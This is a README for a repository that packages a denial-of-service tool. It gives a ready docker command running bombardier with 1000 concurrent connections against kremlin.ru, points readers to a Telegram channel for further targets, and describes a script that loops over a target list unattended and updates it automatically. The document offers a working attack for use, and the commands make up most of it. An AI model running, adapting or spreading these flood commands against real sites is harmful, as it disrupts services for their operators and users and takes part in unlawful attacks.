### [–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –Ω–∞ —Ä—É—Å—Å–∫–æ–º](./README_RU.md)

### Simplified instruction - manual execution
- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
- `docker run -it alpine/bombardier -c 1000 -d 60s -l https://kremlin.ru`
- Last part of the comand is host url, you should pick one [from the last chat messages](https://t.me/itarmyofukraine2022)  

Automatic script performs the same command and loops through a list of hosts, so you can leave it unsupervised overnight or for long periods of time. It also automatically fetches updates to the list.

### Get the code
- Clone the repo - `git clone https://github.com/v1adko/fuckputin.git`   
  or  
[download a zip](https://github.com/v1adko/fuckputin/archive/refs/heads/master.zip) if git clone is taking too long
- Change working directory - `cd ./fuckputin`
- Optionally update [the targets](#targets)

### Targets

Best update targets from [this telegram channel](https://t.me/itarmyofukraine2022)  
Edit contents of the [./fucklist.sh](/fucklist.sh) file

### Run in Docker

*Note*: this could take quite some time, if you're tech-savvy enough,  
try [installing binaries manually](#local) directly on your host system,  
it should be faster

- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
- Optionally update [the targets](#targets)
- `docker-compose up --build` (on some systems compose is not installed with docker)
   **or**
- `docker build -t fuckputin .`
- `docker run fuckputin`

### Local
